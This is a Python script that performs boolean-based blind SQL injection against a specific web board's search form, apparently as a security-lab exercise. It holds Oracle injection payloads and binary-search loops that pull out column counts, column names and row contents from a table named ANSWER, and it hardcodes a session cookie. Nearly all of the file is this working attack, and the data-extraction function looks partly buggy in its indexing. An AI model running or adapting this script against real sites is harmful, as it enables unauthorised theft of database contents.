import requests
URL = 'http://elms1.skinfosec.co.kr:8082/community6/free'
data = {'startDt' : '', 'endDt' : '', 'searchType' : 'all', 'keyword' : ''}
headers = {'Content-Type': 'application/x-www-form-urlencoded'}
cookie = {'JSESSIONID' : {}}

def set_cookie(set_cookie):
    global cookie
    cookie = {'JSESSIONID' : '{}'.format(str(set_cookie))}

def BinarySearch(query,key):
    if key == 'Column_text_length':
        columncount = Columncount()
        columnsave = []
        for i in range(1, columncount+1):
            min = 1
            max = 127 
            while min <= max:
                avg = (min+max) // 2
                data['keyword'] = query.format(str(i), str(avg))
                response = requests.post(URL, headers=headers, cookies=cookie, data=data)
                if '결과가 없습니다.' in response.text:
                    max = avg - 1
                else:
                    min = avg + 1
            columnsave.append(min)
        return columnsave

    elif key == 'Columnname':
        columnsave = Column_text_length()
        columnname_save=[]
        for index in range(len(columnsave)):
            columnname = ''
            for i in range(1, columnsave[index] + 1):
                min = 1
                max = 127
                while min <= max:    
                    avg = (min+max)//2
                    data['keyword'] = query.format(str(index+1),str(i), str(avg))
                    response = requests.post(URL, headers=headers, cookies=cookie, data=data)
                    if '결과가 없습니다.' in response.text:
                        max = avg-1
                    else:
                        min = avg+1
                columnname += chr(min)
            columnname_save.append(columnname)
        return columnname_save
    
    elif key == 'All_find_Column_data_length':
        columnname_save = Columnname()
        columnname_save_data_length = []
        for data_index in range(len(columnname_save)):
            min = 1
            max = 127
            while min <= max:    
                avg = (min + max) // 2
                data['keyword'] = query.format(str(columnname_save[data_index]),str(avg))
                response = requests.post(URL, headers=headers, cookies=cookie, data=data)
                if '결과가 없습니다.' in response.text:
                    max = avg - 1
                else:
                    min = avg + 1
            columnname_save_data_length.append(min)
        return columnname_save_data_length
    else:
        min = 1
        max = 127    
        while min <= max:
            avg = (min+max) // 2
            
            if key == 'ColumnCount':
                data['keyword'] = query.format(str(avg))
            else:
                pass
            response = requests.post(URL,data=data,headers=headers,cookies=cookie)
            if '결과가 없습니다.' in response.text:
                max = avg - 1
            else:
                min = avg + 1
        return min
    
def Data_binary_search(query, columnname_save,columnname_save_data_length):
        data_length=[]
        for data_index in range(len(columnname_save)):
            for z in range(1, columnname_save_data_length[data_index] + 1):
                min = 1
                max = 127
                while min <= max:    
                    avg = (min + max) // 2
                    data['keyword'] = query.format(str(columnname_save[data_index]),str(columnname_save[data_index]),str(z),str(avg))
                    response = requests.post(URL, headers=headers, cookies=cookie, data=data)
                    if '결과가 없습니다.' in response.text:
                        max = avg - 1
                    else:
                        min = avg + 1
                data_length.append(min)
        return data_length
    
def Data_name_search(query,columnname_save,columnname_save_data_length,data_length):
    dataname_save = []
    for i in range(len(columnname_save)):
        dataname = ''
        for z in range(columnname_save_data_length[i]):
            for j in range(data_length[i]):
                min = 1
                max = 127
                while(min + 1 < max):    
                    avg = int((min + max) / 2)
                    data['keyword'] = query.format(str(columnname_save[i]),str(columnname_save[i]),str(columnname_save_data_length[z]),str(j+1), str(avg))
                    # print(data['keyword'])
                    response = requests.post(URL, headers=headers, cookies=cookie, data=data)
                    if '결과가 없습니다.' in response.text:
                        max = avg
                    else:
                        min = avg
                dataname += chr(max) 
            dataname_save.append(dataname)
    return dataname_save

def Columncount():
    key = 'ColumnCount'
    query = "test%' and (SELECT COUNT(COLUMN_NAME) FROM ALL_TAB_COLUMNS WHERE TABLE_NAME = 'ANSWER') > {} and '1%'='1"
    Columncount = BinarySearch(query,key)
    return Columncount

def Column_text_length():
    key = 'Column_text_length'
    query = "test%' and (LENGTH((SELECT COLUMN_NAME FROM (SELECT ROWNUM RNUM, COLUMN_NAME FROM ALL_TAB_COLUMNS WHERE TABLE_NAME = 'ANSWER') WHERE RNUM = {}))) > {} and '1%'='1"
    Column_text_length = BinarySearch(query,key)
    return Column_text_length

def Columnname():
    key = 'Columnname'
    query = "test%' and ASCII(SUBSTR((SELECT COLUMN_NAME FROM (SELECT ROWNUM RNUM, COLUMN_NAME FROM ALL_TAB_COLUMNS WHERE TABLE_NAME = 'ANSWER') WHERE RNUM = {}), {}, 1)) > {} and '1%'='1"
    Column_name = BinarySearch(query, key)
    return Column_name

def All_find_Column_data_length():
    key = 'All_find_Column_data_length'
    query = "test%' and (select count({}) from ANSWER) > {} and '1%'='1"
    columnname_save_data_length = BinarySearch(query, key)
    return columnname_save_data_length

def Data_length(Column_name, columnname_save_data_length):
    query = "test%' and LENGTH((select {} from (select rownum rnum, {} from ANSWER) where rnum ={})) > {} and '1%'='1"
    data_length = Data_binary_search(query, Column_name, columnname_save_data_length)
    return data_length

def Data_name(Column_name, columnname_save_data_length, data_length):
    query = "test%' and ASCII(SUBSTR((SELECT {} FROM (SELECT ROWNUM RNUM, {} FROM ANSWER) WHERE RNUM = {}), {}, 1)) > {} and '1%'='1"
    data_name = Data_name_search(query,Column_name,columnname_save_data_length,data_length)
    return data_name

if __name__ == "__main__":
    scookie='DE61678BE247338AEFF48A11085863E1'
    set_cookie(scookie)
    print(Columncount())